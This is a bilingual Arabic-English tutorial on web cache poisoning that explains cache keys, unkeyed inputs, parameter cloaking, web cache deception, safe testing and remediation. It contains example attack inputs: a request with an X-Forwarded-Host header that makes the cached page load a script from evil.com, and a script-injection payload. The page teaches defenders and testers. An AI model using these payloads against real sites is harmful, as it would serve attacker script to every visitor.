تسميم الذاكرة المؤقتة (Web Cache Poisoning) — الدليل الشامل

Web Cache Poisoning — The Ultimate Deep Dive

CRITICAL / HIGH Advanced Web Attacks
AR

تسميم الذاكرة المؤقتة للويب (Web Cache Poisoning) هي تقنية متقدمة تحدث عندما يتلاعب المهاجم برد الخادم (Response) ويجعله خبيثاً، ثم يتم حفظ هذا الرد الخبيث في الذاكرة المؤقتة (Cache) ليتم تقديمه لكل المستخدمين الشرعيين الآخرين. خطورة هذه الثغرة تكمن في أنها تحول ثغرة غير ضارة (مثل Reflected XSS لا يمكن استغلالها إلا بنقرة مستخدم) إلى ثغرة Stored XSS تصيب كل من يزور الصفحة بدون أي تدخل!

EN

Web Cache Poisoning occurs when an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users. By sending a request with hidden headers or unkeyed parameters, the attacker forces the server to generate a malicious payload, which the cache then saves and serves to victims.

مفاهيم أساسية (Cache Keys & Unkeyed Inputs)

لفهم الثغرة، يجب فهم كيف تعمل الذاكرة المؤقتة (Varnish, Cloudflare, Fastly, etc):

  • Cache Key (مفتاح الكاش): هو الجزء من الطلب الذي يستخدمه الكاش لتمييز الطلبات عن بعضها. عادةً ما يكون Host + URL Path + Query String.
  • Unkeyed Input (المدخلات غير المفتاحية): هي الأجزاء من الطلب التي يتجاهلها الكاش عند حفظ الرد (مثل X-Forwarded-Host، User-Agent أحياناً، والـ Headers غير القياسية).

الفكرة: إذا أرسلت Unkeyed Input خبيث أدى لتغيير في صفحة الويب (الرد)، سيقوم الكاش بحفظ هذا الرد تحت الـ Cache Key العادي، وسيحصل الجميع على الرد المسموم!

آلية الاستغلال والهجمات (Attack Vectors)

1. Unkeyed Header Injection (X-Forwarded-Host)

أكثر الأنواع شيوعاً. التطبيق يستخدم X-Forwarded-Host لتوليد روابط لملفات الـ JS:

GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil.com

استجابة الخادم وتسميم الكاش:

HTTP/1.1 200 OK
Cache-Control: public, max-age=1800

<script src="https://evil.com/setup.js"></script>

الآن كل زائر لـ /en?region=uk سيتم تحميل سكربت evil.com لديه.

2. Parameter Cloaking (إخفاء المعاملات)

إذا كان الكاش يستبعد باراميتر معين من הـ Cache Key (مثلاً الـ UTM parameters للتتبع):

GET /page?utm_content=x&xss="><script>alert(1)</script> HTTP/1.1

أو التلاعب بمعالجة الـ Query string (مثلاً الخادم يعتبر ?a=1;b=2 معاملين، بينما الكاش يعتبره معاملاً واحداً).

3. Cache Deception (Web Cache Deception)

تختلف عن التسميم! هنا المهاجم يخدع الضحية لزيارة مسار مثل /my-profile/index.css. الكاش يرى .css فيحفظ الصفحة (وهي في الحقيقة ملف شخصي يحتوي بيانات حساسة للضحية). المهاجم يزور نفس الرابط لاحقاً ويقرأ بيانات الضحية من الكاش (يُشار إليها بـ WCD).

أدوات الأتمتة (Automation Tools)

Param Miner (Burp Ext) Cache Poisoning Scanner TruffleHog (for Cache)

إضافة Param Miner (برمجة James Kettle) هي الأداة القياسية الذهبية لاكتشاف الـ Unkeyed Headers بشكل خفي (Background) أثناء تصفحك للموقع عبر Burp Suite.

منع إيذاء المستخدمين أثناء الاختبار (Safe Testing)

تنبيه: اختبار تسميم الكاش يمكن أن يكسر الموقع للزوار الحقيقيين (Denial of Service) أو يخترقهم!

  • دائماً أضف باراميتر خاص بك (Cache Buster) كجزء من הـ Cache Key عند الاختبار: GET /?test=12345abdo.
  • بهذه الطريقة، إذا سممت الكاش، سيتسمم فقط لـ /?test=12345abdo ولن يتأثر زوار الصفحة الرئيسية /.

كيفية الحماية (Remediation)

  • تجنب استخدام بيانات من HTTP Headers لبناء ردود (Responses) أو روابط (URLs) بأي شكل من الأشكال (خاصة X-Forwarded-* و Host).
  • إذا كنت مضطراً لاستخدامها، قم بإضافتها إلى قائمة הـ Vary Header لضمان تخزين الكاش بشكل منفصل بناءً عليها (تصبح Keyed).
  • تعطيل التخزين المؤقت (Caching) للصفحات التي تعكس مدخلات المستخدمين.
